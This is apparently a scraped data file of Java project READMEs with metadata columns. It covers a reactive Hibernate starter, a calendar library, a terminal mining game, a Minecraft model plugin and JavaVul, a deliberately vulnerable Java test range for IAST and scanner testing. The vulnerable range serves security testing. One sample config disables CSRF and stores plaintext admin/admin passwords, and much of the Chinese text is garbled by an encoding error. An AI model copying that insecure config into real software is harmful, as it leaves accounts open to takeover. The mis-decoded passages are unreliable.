To achieve this, first build a docker image of your app by running:

```
npm run java:docker
```

Or build a arm64 docker image when using an arm64 processor os like MacOS with M1 processor family running:

```
npm run java:docker:arm64
```

Then run:

```
docker compose -f src/main/docker/app.yml up -d
```

When running Docker Desktop on MacOS Big Sur or later, consider enabling experimental `Use the new Virtualization framework` for better processing performance ([disk access performance is worse](https://github.com/docker/roadmap/issues/7)).

For more information refer to [Using Docker and Docker-Compose][], this page also contains information on the docker-compose sub-generator (`jhipster docker-compose`), which is able to generate docker configurations for one or several JHipster applications.

## Continuous Integration (optional)

To configure CI for your project, run the ci-cd sub-generator (`jhipster ci-cd`), this will let you generate configuration files for a number of Continuous Integration systems. Consult the [Setting up Continuous Integration][] page for more information.

[BegCodeæœ€æ–°æ–‡æ¡£]: https://www.begcode.com
[Node.js]: https://nodejs.org/
[NPM]: https://www.npmjs.com/
[Webpack]: https://webpack.github.io/
[BrowserSync]: https://www.browsersync.io/
[Jest]: https://facebook.github.io/jest/
[Leaflet]: https://leafletjs.com/
[DefinitelyTyped]: https://definitelytyped.org/
",0,1,1,0.0,"['monolithmybatis', 'jhipster', 'control', 'center', 'spring', 'boot', 'test', 'client', 'test', 'use', 'docker', 'simplify', 'development', 'optional', 'continuous', 'integration', 'optional']","['test', 'optional', 'monolithmybatis', 'jhipster', 'control']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,com.github.eirslett:frontend-maven-plugin,com.google.cloud.tools:jib-maven-plugin,io.github.git-commit-id:git-commit-id-maven-plugin,net.nicoulaj.maven.plugins:checksum-maven-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-checkstyle-plugin,org.apache.maven.plugins:maven-clean-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:properties-maven-plugin,org.eclipse.m2e:lifecycle-mapping,org.gaul:modernizer-maven-plugin,org.jacoco:jacoco-maven-plugin,org.liquibase:liquibase-maven-plugin,org.sonarsource.scanner.maven:sonar-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
anaconda875/reactive-hibernate-spring-boot-starter,main,"## This module's aim is to bring Reactive Hibernate support to Spring Data.
### Some features:
1. Useful Crud and Paging/Sorting methods (just like spring-data-jpa)
2. Custom query methods (findBy\*And\*OrderBy*, @Query(""FROM Abc"")), native queries are also supported
3. Support `@Transactional` (**propagation, readOnly, rollbackFor, timeout, noRollbackFor, ...**)
4. Support `@Modifying`, `@Param`
5. Support `@Lock`, `@EntityGraph`
6. Support `@NamedQuery`, `@NamedEntityGraph`
7. Support SpEL
8. Support Pagination
9. Support Auditing
10. Auto-config
11. Of course, it is truly non-blocking and compatible with Webflux

### Some remaining things:
1. Isolation level ([#875](https://github.com/hibernate/hibernate-reactive/issues/875) and [#432](https://github.com/eclipse-vertx/vertx-sql-client/issues/432)), savepoint
2. Stored procedure ([#1446](https://github.com/eclipse-vertx/vertx-sql-client/issues/1446) and [#637](https://github.com/hibernate/hibernate-reactive/issues/637))
3. Code optimization

## Getting started:
**1. Dependency and config:**
```xml
<dependency>
    <groupId>io.github.anaconda875</groupId>
    <artifactId>reactive-hibernate-spring-boot-starter</artifactId>
    <version>1.1.0</version>
</dependency>
```
Sometimes you might need to add (in case of dependencies conflict):
```xml
<dependency>
    <groupId>org.hibernate.orm</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>6.4.4.Final</version>
    <scope>compile</scope>
</dependency>
```
Add a suitable driver (for example, MySQL):
```xml
<dependency>
    <groupId>io.vertx</groupId>
    <artifactId>vertx-mysql-client</artifactId>
    <version>${your.version}</version>
</dependency>
```
Then add these (example) configs:
```properties
spring.jpa.properties.jakarta.persistence.jdbc.url=jdbc:mysql://localhost:3306/blogdb
spring.jpa.properties.jakarta.persistence.jdbc.user=mysql
spring.jpa.properties.jakarta.persistence.jdbc.password=mysql

spring.jpa.properties.hibernate.connection.pool_size=10

spring.jpa.properties.hibernate.enhancer.enableDirtyTracking=false
spring.jpa.properties.hibernate.enhancer.enableLazyInitialization=false
spring.jpa.properties.hibernate.enhancer.enableAssociationManagement=false
```
**2. Useful Crud and Paging/Sorting methods**: see [ReactiveCrudRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactiveCrudRepository.java) and [ReactivePagingAndSortingRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactivePagingAndSortingRepository.java)  
**3. Custom query methods (with `Pageable`, `@Lock`, `@EntityGraph`, `@Param`, `@Transactional`, `@Modifying`):**
```java
  @Lock(LockModeType.PESSIMISTIC_READ)
  @EntityGraph(attributePaths = {""content""})
  Flux<Post> findByContentOrderByCreatedAtDesc(String content);
```
```java
  @Query(""SELECT p FROM Post p WHERE p.content = ?1"")
  Mono<Page<Post>> findByContentCustomPage(String content, Pageable pageable);
```
```java
    @Query(
        nativeQuery = true,
        value =
            ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by "" +
                ""FROM posts WHERE id = ?1"")
    Mono<Post> nativeQ(UUID id);
```
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by ""
              + ""FROM posts WHERE content = :content"")
  Flux<Post> nativeQ2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(nativeQuery = true, value = ""DELETE from posts WHERE content = :content"")
  @Transactional
  Mono<?> deleteNative2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(""DELETE FROM Post p WHERE p.title = :title"")
  Mono<?> deleteCustom(@Param(""title"") String title);
```
**4. Support `@NamedQuery`, `@NamedEntityGraph`, Auditing:**
```java
@Data
@Entity
@NamedQueries(
    value = {
      @NamedQuery(
          name = ""Post.testNamed"",
          query = ""SELECT p FROM Post p WHERE p.content = :content"")
    })
@NamedEntityGraphs({
  @NamedEntityGraph(
      name = ""Post.testNamed"",
      attributeNodes = {@NamedAttributeNode(""title"")})
})
public class Post {

  @Id
  @GeneratedValue(generator = ""uuid"")
  @GenericGenerator(name = ""uuid"", strategy = ""uuid2"")
  UUID id;

  String title;
  String content;

  //<Auditing>
  @Column(name = ""created_at"")
  @CreatedDate
  LocalDateTime createdAt;

  @Column(name = ""last_modified_at"")
  @LastModifiedDate
  LocalDateTime lastModifiedAt;

  @Column(name = ""created_by"")
  @CreatedBy
  String createdBy;

  @Column(name = ""last_modified_by"")
  @LastModifiedBy
  String lastModifiedBy;
  //</Auditing>
}
```
```java
  //In repository
  @Lock(LockModeType.READ)
  @EntityGraph
  Mono<Page<Post>> testNamed(String content, Pageable pageable);
```
```java
//Config for Pagination, Auditing
@Configuration
@EnableReactiveJpaAuditing(auditorAwareRef = ""reactiveAuditorAware"")
public class Config {

  @Bean
  WebFluxConfigurer webFluxConfigurer() {
    return new WebFluxConfigurer() {
      @Override
      public void configureArgumentResolvers(ArgumentResolverConfigurer configurer) {
        configurer.addCustomResolver(new ReactivePageableHandlerMethodArgumentResolver());
      }
    };
  }

  @Bean
  ReactiveAuditorAware<String> reactiveAuditorAware() {
    return () ->
        ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(Authentication::getPrincipal)
            .map(UserDetails.class::cast)
            .map(UserDetails::getUsername);
  }

  @Bean
  SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
        .authorizeExchange(authorize -> authorize.anyExchange().authenticated())
        .httpBasic(Customizer.withDefaults())
        .build();
  }

  @Bean
  ReactiveUserDetailsService userDetailsService() {
    var isabelle = User.withUsername(""admin"").password(""admin"").authorities(""admin"").build();

    var bjorn =
        User.withUsername(""anonymous"").password(""anonymous"").authorities(""anonymous"").build();

    return new MapReactiveUserDetailsService(isabelle, bjorn);
  }

  @Bean
  PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance();
  }

  @Bean
  ReactiveEvaluationContextExtension securityExtension() {
    return new ReactiveEvaluationContextExtension() {

      @Override
      public String getExtensionId() {
        return ""webflux-security"";
      }

      @Override
      public Mono<? extends EvaluationContextExtension> getExtension() {
        return ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(SecurityEvaluationContextExtension::new);
      }
    };
  }
}

```
**5. SpEL:**
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by FROM posts "" +
              ""WHERE created_by = :#{authentication.name} AND title = :title "" +
              ""AND last_modified_by = :#{authentication.name}"")
  Mono<Post> testSpelNative2(@Param(""title"") String title);
```
```java
  @Query(
      ""SELECT p from #{#entityName} p WHERE p.lastModifiedBy = :#{authentication.name} AND p.title = ?1 AND p.createdBy = :#{authentication.name}"")
  @EntityGraph(attributePaths = {""createdBy""})
  Mono<Post> testSpel3(String title);
```

**6. TO BE CONTINUED...**

This is an example of how to use it (with Postgres): https://github.com/anaconda875/spring-hibernate-reactive-mutiny-example

If you guys find it useful for our business, feel free to use and report bugs to me
",0,0,12,11.0,"['this', 'module', 'aim', 'bring', 'reactive', 'hibernate', 'support', 'spring', 'data', 'some', 'feature', 'some', 'remain', 'thing', 'get', 'start']","['some', 'this', 'module', 'aim', 'bring']",1.0,"[com.spotify.fmt:fmt-maven-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.sonatype.central:central-publishing-maven-plugin]",0.0,1.0,0.0
6tail/tyme4j,master,"# Tyme [![License](https://img.shields.io/badge/license-MIT-4EB1BA.svg?style=flat-square)](https://github.com/6tail/tyme4j/blob/master/LICENSE)

Tymeæ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„æ—¥å†å·¥å…·åº“ï¼Œå¯ä»¥çœ‹ä½œ [Lunar](https://6tail.cn/calendar/api.html ""https://6tail.cn/calendar/api.html"") çš„å‡çº§ç‰ˆï¼Œæ‹¥æœ‰æ›´ä¼˜çš„è®¾è®¡å’Œæ‰©å±•æ€§ï¼Œæ”¯æŒå…¬å†å’Œå†œå†ã€æ˜Ÿåº§ã€å¹²æ”¯ã€ç”Ÿè‚–ã€èŠ‚æ°”ã€æ³•å®šå‡æ—¥ç­‰ã€‚

### Maven

```xml
<dependency>
  <groupId>cn.6tail</groupId>
  <artifactId>tyme4j</artifactId>
  <version>1.1.4</version>
</dependency>
```

## ç¤ºä¾‹

    import com.tyme.solar.SolarDay;
     
    public class Sample {
      public static void main(String[] args) {
        SolarDay solarDay = SolarDay.fromYmd(1986, 5, 29);
         
        // 1986å¹´5æœˆ29æ—¥
        System.out.println(solarDay);
         
        // å†œå†ä¸™å¯…å¹´å››æœˆå»¿ä¸€
        System.out.println(solarDay.getLunarDay());
      }
    }

## æ–‡æ¡£

è¯·ç§»æ­¥è‡³ [https://6tail.cn/tyme.html](https://6tail.cn/tyme.html ""https://6tail.cn/tyme.html"")

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=6tail/tyme4j&type=Date)](https://star-history.com/#6tail/tyme4j&Date)
",14,2,1,3.0,"['tyme', 'license', 'http', 'http', 'maven', 'star', 'history']","['http', 'tyme', 'license', 'maven', 'star']",1.0,"[org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
RobertElderSoftware/robert-elder-software-java-modules,master,"#  CONTRIBUTING

DO NOT CREATE PULL REQUESTS FOR THIS PROJECT.

ANY PULL REQUESTS YOU CREATE WILL NOT BE MERGED IN.

This project does not currently accept pull requests from the public.

Having said this, please do file issues if you notice something broken or undesirable.

#  Terminal Block Mining Simulation Game

![Terminal Block Mining Simulation Game](block-mining-simulation-game-thumbnail.png ""Terminal Block Mining Simulation Game"")

This project contains the 'Terminal Block Mining Simulation Game', a video game where you simulate mining blocks of iron ore in the terminal.  The game uses procedural terrain generation and the game world itself is infinite.  The terrain will start generating automatically in the background near the player.  All generated terrain and player data is stored in a SQLite database file.  The location of this world file defaults to the directory where you launch the game, but you can configure it with the '--block-world-file' flag.  You can also use the '--log-file' to set the location of a log file.  If the '--log-file' flag is omitted, logging will be disabled.

#  Player Movement

You can use the 'w', 'a', 's' 'd' keys to move around on the screen.  You can use the space bar to go up and the 'x' key to move down (assuming there isn't a solid block in the way on a different level).

#  Exiting/Quitting The Game

Press the 'q' key to quit the game.

#  Mining Blocks

Press the 'm' key to mine blocks.

#  Crafting

You can press the 'c' key to try and craft new blocks, such as metallic iron, and an iron pickaxe.  Currently, the game only supports four different crafting recepies:

-  Using wood to make a Wooden Pick Axe
-  Using stone and wood to make a Stone Pick Axe
-  Using iron oxide and wood to make Metallic Iron
-  Using metallic iron and wood to make an Iron Pick Axe

#  Place Blocks

Press the 'p' key to place blocks (currently only supports placing rock blocks).

#  Help Menu


You can run the .jar file with the '--help' flag to show a help menu:

```
java -jar block-mining-simulation-game-single-player-client-0.0.5.jar --help
```


```
Block Mining Simulation Game - Available Command-line Arguments:

--help                                     - Display this help menu.
--debug-arguments                          - Echo back info about the value of command line argument values were parsed, and what the default values are.
--log-file                        <arg>    - The name of the log file to use.  If not provided, there will be no logging.
--disable-jni                              - Disable the use of JNI (may cause some events like to window size changes to be ignored).
--restricted-graphics                      - Use only the simplest ASCII characters to produce graphics.  Required when running on non-graphical display ttys.
--allow-unrecognized-block-types           - Allow the game to run even when there are block types that aren't supported in the block schema.
--block-world-file                <arg>    - The name of the sqlite database file (SQLITE only).
--print-block-schema                       - Print current block schema and exit.
--block-schema-file               <arg>    - If specified, ignore the default built-in block schema and uses the one provided at file/path.
--print-user-interaction-config            - Print the current configuration that describes which keys control the game.
--user-interaction-config-file    <arg>    - If specified, ignore the default built-in user interaction config and uses the one provided at file/path.
--database-subprotocol            <arg>    - The protocol for the database connection string.  Currently supports 'postgresql' and 'sqlite'.
--database-hostname               <arg>    - The 'hostname' for the database connection. Can be IP address or DNS name.
--database-port                   <arg>    - The port for the database connection.
--database-name                   <arg>    - The 'name' of the database to connect to for the database connection string.
--database-username               <arg>    - The username for the database connection.
--database-password               <arg>    - The password for the database connection.
```

#  Supported Platforms

Currently, the game has only been tested to work on a default installation of Ubuntu Linux.

#  Launching The Game

Compiling the game from scratch is not necessary.  You can download pre-compiled .jar files from GitHub in the 'Releases' section for this repo:

```
wget https://github.com/RobertElderSoftware/robert-elder-software-java-modules/releases/download/0.0.5/block-mining-simulation-game-single-player-client-0.0.5.jar
java -jar block-mining-simulation-game-single-player-client-0.0.5.jar
```

The game should immediately launch and fill up the terminal with graphics.  You can exit the game by pressing the 'q' key.  By default, the game saves it's world data into a SQLite database file that lives in the current directory.

#  Verify The Jar Signature (Optional)

If you are concerned about the authenticity of the .jar file, you can also verify the signature using GPG:

```
wget https://github.com/RobertElderSoftware/robert-elder-software-java-modules/releases/download/0.0.5/block-mining-simulation-game-single-player-client-0.0.5.jar.asc
gpg --search-keys robert@robertelder.org
#  Should match the key for 'robert@robertelder.org'
gpg --recv-keys ECBD481DBCA5C48804FBD08720B9852CF0558BAA
gpg --verify block-mining-simulation-game-single-player-client-0.0.5.jar.asc block-mining-simulation-game-single-player-client-0.0.5.jar
```

The output should look something like this:

```
gpg: Signature made Thu 01 Aug 2024 01:49:03 PM EDT
gpg:                using ECDSA key ECBD481DBCA5C48804FBD08720B9852CF0558BAA
gpg: Good signature from ""Robert Elder (Created on 2024-07-31) <robert@robertelder.org>"" [unknown]
gpg: WARNING: This key is not certified with a trusted signature!
gpg:          There is no indication that the signature belongs to the owner.
Primary key fingerprint: ECBD 481D BCA5 C488 04FB  D087 20B9 852C F055 8BAA
```

#  Building The Game

To build the game, you will need to set up a development environment that can support Java 17 and a version of maven that can support Java 17.

To build the JNI library, you will also need a c++ compiler and make

```
sudo apt-get install g++ make
```

Next, you can compile the game from source by running this command:

```
./res-modules/block-mining-simulation-game-single-player-client/run_single_player_client.sh
```

Once it finishes building, it should launch right into the game.

#  Alternative Key Mappings (Dvorak)

I received a couple requests to add support for reconfiguring the mapping of keyboard inputs, so I've added an option to specify a JSON config file where you can customize which input characters will trigger different actions in the game:

```
--user-interaction-config-file custom_key_config.json
```

For a Dvorak keyboard, I believe the following should work to give you the same experience that you'd get on a querty keyboard (although I can't say for sure as I don't have a Dvorak keyboard):

```
{
	""ACTION_Y_PLUS"": "","",
	""ACTION_Y_MINUS"": ""o"",
	""ACTION_X_PLUS"": ""e"",
	""ACTION_X_MINUS"": ""a"",
	""ACTION_Z_PLUS"": "" "",
	""ACTION_Z_MINUS"": ""q"",
	""ACTION_MINING"": ""m"",
	""ACTION_CRAFTING"": ""j"",
	""ACTION_QUIT"": ""'"",
	""ACTION_PLACE_BLOCK"": ""l""
}
```

You can see the default user interaction config file printed to standard out by running the jar with the following parameter:

```
--print-user-interaction-config
```

#  License

See LICENSE.md
",5,0,1,0.0,"['contributing', 'terminal', 'block', 'mining', 'simulation', 'game', 'player', 'movement', 'the', 'game', 'mining', 'block', 'craft', 'place', 'block', 'help', 'menu', 'support', 'platform', 'launch', 'the', 'game', 'verify', 'the', 'jar', 'signature', 'optional', 'should', 'match', 'key', 'build', 'the', 'game', 'alternative', 'key', 'mapping', 'dvorak', 'license']","['game', 'the', 'block', 'mining', 'key']",5.0,"[maven-antrun-plugin,maven-clean-plugin,maven-compiler-plugin,maven-deploy-plugin,maven-install-plugin,maven-jar-plugin,maven-project-info-reports-plugin,maven-resources-plugin,maven-site-plugin,maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,3.0,2.0
GeyserExtensionists/GeyserModelEngine,main,"# GeyserModelEngine 
# About

Thanks to [Willem](https://github.com/OmeWillem) for adding the following features:
- Part Visibility
- Color support
- Scaling support
- & more

# How To Install

Download the following plugins according to what server software you use.

| plugins                        | Link                                                                 | effect                          |
| :---                           | :----                                                                | :---                            |
| GeyserUtils                    | [Github](https://github.com/GeyserExtensionists/GeyserUtils)                    | Get your Geyser to support calling some BE stuff  |
| GeyserModelEngine              | [Github](https://github.com/GeyserExtensionists/GeyserModelEngine)              | Make your bedrock support MEG4                            |
| GeyserModelEnginePackGenerator | [Github](https://github.com/GeyserExtensionists/GeyserModelEnginePackGenerator) | Help you automatically transform the model to generate resource packs        |

- Put `GeyserModelEngine` in the plugins folder (only Spigot or forks of Spigot supported)
- Put either `geyserutils-spigot` in your plugins folder aswell (`geyserutils-velocity`/`geyserutils-bungeecord` in your Velocity/Bungeecord plugins folder if you use it)
- Put `GeyserModelEnginePackGenerator` and `geyserutils-geyser` into `plugins/[Geyser-Folder]/extensions`

Start the server to generate the relevant configuration files, and then shut down the server to convert any models.

# Convert Models

`GeyserModelEnginePackGenerator` is capable of generating models all by itself. After generating it will also apply this pack automatically.

- First go to `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator/input/`
- Create a folder in this directory with the ID of the model. (this is the same name as your model within ModelEngine 4.)

<img src=""docsimg/example.jpg"" width=""500"">

> Each model should have a separate model folder
> Subfolders are supported if you want to categorize them

- Now use BlockBench and convert your model to a Bedrock Entity, this will allow you to export the Bedrock Geometry and Animations.
- Put the geometry, animations and texture file in this folder you've made.

> The new version of BlockBench exports the bedrock model format_version as `1.21.0`.
> You need to change it to `1.12.0` manually.
> Otherwise your client will NOT see the model.

<img src=""docsimg/example1.jpg"" width=""500"">

- Restart the server or reload geyser to start generating the resource pack.
- Go to  `plugins/[Geyser-Folder]/extensions/geysermodelenginepackgenerator`, and you should see your pack generated!

<img src=""docsimg/example2.jpg"" width=""500"">

- Final step, reload Geyser or restart the server to load the resource pack.
- Congratulations, you've completed this tutorial!

# Tips

* Pay attention! The pack only regenerates when the number of models changes, you can technically speaking remove the generated_pack folder to force a reload aswell.
* You do not have to manually put the pack into the packs folder of Geyser, the extension is capable of loading the pack itself.

# Current issues

* Multi-textures are not supported
* Please report any bugs

# FAQ

### Where can I contact you?
You can contact us on our Discord: https://discord.gg/NNNaUdAbpP
",2,1,3,13.0,"['geysermodelengine', 'about', 'how', 'to', 'install', 'convert', 'model', 'tip', 'current', 'issue', 'faq', 'where', 'i', 'contact', 'you']","['geysermodelengine', 'about', 'how', 'to', 'install']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,1.0,0.0
lokerxx/JavaVul,master,"# JavaVul

![](https://socialify.git.ci/lokerxx/JavaVul/image?description=1&font=Inter&forks=1&name=1&owner=1&pattern=Circuit%20Board&stargazers=1&theme=Light)

## ä»‹ç»

Java å®‰å…¨æ¼æ´é¶åœºï¼Œç”¨äºæµ‹è¯•IASTå’Œæ‰«æå™¨çš„è¢«åŠ¨æ‰«æåŠŸèƒ½ï¼Œé›†åˆäº†å¤šä¸ªå®‰å…¨æ¼æ´ï¼Œåˆ©ç”¨dockeré•œåƒä¸ºæ¯ä¸ªé¶åœºç‹¬ç«‹ç¯å¢ƒè¿è¡Œã€‚

æ–‡ç« ï¼š[IASTå®è·µæ€»ç»“](https://mp.weixin.qq.com/s/ahxKXv5eKcULVF_VqAjbyg)

## éƒ¨ç½²

mvnç‰ˆæœ¬

```sh
# mvn --version
Apache Maven 3.0.5 (Red Hat 3.0.5-17)
Maven home: /usr/share/maven
Java version: 1.8.0_192, vendor: Oracle Corporation
Java home: /usr/java/jdk1.8.0_192/jre
Default locale: en_US, platform encoding: UTF-8
OS name: ""linux"", version: ""3.10.0-1160.el7.x86_64"", arch: ""amd64"", family: ""unix""
```

dockerå’Œdocker-composeç‰ˆæœ¬

```sh
# docker version
Client:
 Version:         1.13.1
 API version:     1.26
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64

Server:
 Version:         1.13.1
 API version:     1.26 (minimum version 1.12)
 Package version: docker-1.13.1-209.git7d71120.el7.centos.x86_64
 Go version:      go1.10.3
 Git commit:      7d71120/1.13.1
 Built:           Wed Mar  2 15:25:43 2022
 OS/Arch:         linux/amd64
 Experimental:    false

# docker-compose version
docker-compose version 1.18.0, build 8dd22a9
docker-py version: 2.6.1
CPython version: 3.6.8
OpenSSL version: OpenSSL 1.0.2k-fips  26 Jan 2017
```

> é»˜è®¤dockerå’Œdocker-composeå¤ªä½ï¼Œéœ€è¦å®‰è£…æ¯”è¾ƒæ–°çš„
>
> ```
>  yum remove docker \
>               docker-client \
>               docker-client-latest \
>               docker-common \
>               docker-latest \
>               docker-latest-logrotate \
>               docker-logrotate \
>               docker-engine
> 
> sudo yum install -y yum-utils
> sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo
> 
> sudo yum install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin docker-compose
> ```

ä¸‹è½½é¡¹ç›®

```sh
git clone https://github.com/lokerxx/JavaVul
```

ä»¥ä¸‹æ˜¯è¿è¡Œè„šæœ¬ï¼š

|            æ–‡ä»¶            |                             ä½œç”¨                             |            è¿è¡Œ            |
| :------------------------: | :----------------------------------------------------------: | :------------------------: |
| docker-compose-build.yaml  | åœ¨å®¹å™¨é‡Œé¢æ„å»ºjaråŒ…ï¼Œæ¯ä¸ªé¶åœºæ„å»ºä¼šé‡å¤æ„å»ºï¼ˆ**æ„å»ºé€Ÿåº¦ä¼šå¾ˆæ…¢ï¼Œä¸å»ºè®®**ï¼‰ | `bash run-build_images.sh` |
| docker-compose-local.yaml  | å®¿ä¸»æœºmavenæ„å»ºå„ä¸ªé¶åœºçš„jaråŒ…ï¼Œå¤šä¸ªé¶åœºå¯ä»¥åŸºäºmavenç¼“å­˜å¿«é€Ÿæ„å»ºï¼ˆ**æ¨è**ï¼‰ | `bash run-local-build.sh`  |
| docker-compose-remote.yaml | ç›´æ¥å»dockerhubä¸‹è½½æˆ‘æ„å»ºä¸Šä¼ æˆåŠŸçš„é•œåƒï¼ˆ**é•œåƒæ›´æ–°ä¸åŠæ—¶**ï¼‰ |    `bash run-remote.sh`    |

> æ­¤å¤–ï¼Œéœ€ä¿®æ”¹yamlæ–‡ä»¶é‡Œé¢`flask.environment.HOST`ä¸ºå®¿ä¸»æœºçš„IPï¼Œç”¨äºè·‘æµ‹è¯•ç”¨ä¾‹ã€‚**ç„¶åæˆ‘åœ¨yamlæ–‡ä»¶å·²ç»é»˜è®¤æŒ‚è½½agent.jar**ï¼Œå¦‚æœä½ ä»¬è¦æµ‹è¯•IAST agentåŠŸèƒ½ï¼Œç›´æ¥æ›¿æ¢åˆ°`agent/agent.jar`å³å¯ã€‚æˆ‘è¿™è¾¹è‡ªå·±å†™äº†ä¸€ä¸ªç®€å•çš„java agentï¼Œå‚è€ƒä¸‹é¢[SimpleAgent]()

> å¦‚æœè¦æµ‹è¯•è¢«åŠ¨ä»£ç†æ‰«æï¼Œéœ€è¦ä¿®æ”¹`index/app.py`é‡Œé¢`proxy_mode`ä¸º`True`ï¼Œä¿®æ”¹è‡ªå·±çš„ä»£ç†åœ°å€ï¼š`proxies`

> **ä¿®æ”¹å®Œæˆä¹‹åï¼Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚ï¼Œè¿è¡Œä¸Šé¢è¡¨æ ¼çš„shè„šæœ¬éƒ¨ç½²è¿è¡Œå³å¯**ã€‚

> å› ä¸ºæ¼æ´åº”ç”¨æ¯”è¾ƒå¤š**ä½†æ˜¯æ¥å£æ¯”è¾ƒå°‘**ï¼Œæˆ‘ç»™æ¯ä¸ªåº”ç”¨é…ç½®512-1024Må†…å­˜ï¼ˆæµ‹è¯•è¿è¡Œè¦16Gå†…å­˜ï¼‰ã€‚å¦‚æœè¦é…ç½®å¤§ä¸€ç‚¹æµ‹è¯• IAST AGENTï¼Œåˆ™å¯ä»¥æ‰¹é‡ä¿®æ”¹`docker-compose.yaml`çš„`-Xms512m -Xmx1024m`çš„ç¯å¢ƒå˜é‡

> åŸºæœ¬webæ¼æ´çš„ä»£ç å®¡è®¡çš„ç»†èŠ‚ï¼Œå‚è€ƒè¿™é‡Œï¼šhttps://github.com/lokerxx/CybersecurityNote/tree/master/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA%E6%BC%8F%E6%B4%9E



### å‹åŠ›æµ‹è¯•

éƒ¨ç½²è¿è¡Œ

|              æ–‡ä»¶               |                         ä½œç”¨                         |          è¿è¡Œ          |
| :-----------------------------: | :--------------------------------------------------: | :--------------------: |
| docker-compose-microservice.yml | è¿è¡Œå¤šä¸ªspringcloudå¾®æœåŠ¡ï¼Œç”¨äºæµ‹è¯•å¤šé“¾è·¯ IAST agent | `run-local-service.sh` |

æµ‹è¯•ç”¨ä¾‹

| æ¥å£                                            | å‹æµ‹å‘½ä»¤                                                     |
| ----------------------------------------------- | ------------------------------------------------------------ |
| http://ip:29998/process-user-data?userData=test | ` ab -n 1000 -c 20 ""http://IP:29998/process-user-data?userData=test""` |



## æ”¯æŒé¶åœº

|          æ–‡ä»¶å¤¹           |                           å®‰å…¨æ¼æ´                           |  æµ‹è¯•ç”¨é€”  |                       å¤‡æ³¨                        |
| :-----------------------: | :----------------------------------------------------------: | :--------: | :-----------------------------------------------: |
|  actuator_authorized_1.X  |                   actuator æœªæˆæƒè®¿é—® 1.X                    |    ä¿®å¤    |                                                   |
|  actuator_authorized_2.X  |                   actuator æœªæˆæƒè®¿é—® 2.X                    |    ä¿®å¤    |                                                   |
| actuator_unauthorized_1.X |                   actuator æœªæˆæƒè®¿é—® 1.X                    |    æ¼æ´    |                                                   |
| actuator_unauthorized_2.X |                   actuator æœªæˆæƒè®¿é—® 2.X                    |    æ¼æ´    |                                                   |
|         base_vul          | SQLæ³¨å…¥ã€XSSã€ä¸å®‰å…¨æ–‡ä»¶æ“ä½œã€é‡å®šå‘æ¼æ´ã€æ­£åˆ™DOSæ¼æ´ã€Crlfæ³¨å…¥æ¼æ´ã€å‘½ä»¤æ³¨å…¥æ¼æ´ã€SPELæ¼æ´ã€SSRFæ¼æ´ã€SSTIæ¼æ´ã€ä¸å®‰å…¨åå°„æ¼æ´ã€XXEæ¼æ´ |    æ¼æ´    |                                                   |
|      base_vul_repair      | SQLæ³¨å…¥ã€XSSã€ä¸å®‰å…¨æ–‡ä»¶æ“ä½œã€é‡å®šå‘æ¼æ´ã€æ­£åˆ™DOSæ¼æ´ã€Crlfæ³¨å…¥æ¼æ´ã€å‘½ä»¤æ³¨å…¥æ¼æ´ã€SPELæ¼æ´ã€SSRFæ¼æ´ã€SSTIæ¼æ´ã€ä¸å®‰å…¨åå°„æ¼æ´ã€XXEæ¼æ´ |    ä¿®å¤    |                                                   |
|          cas_xxe          |                           XXEæ¼æ´                            |    æ¼æ´    | casåœ¨3.1.1-3.5.1å­˜åœ¨XXEæ¼æ´<br />ä¿®å¤ç‰ˆæœ¬ä¸º3.6.0- |
|        collections        |                     collections ååºåˆ—åŒ–                     | **æœªå®Œæˆ** |                                                   |
|      CVE-2019-10173       |                     XStreamååºåˆ—åŒ–æ¼æ´                      |    æ¼æ´    |                                                   |
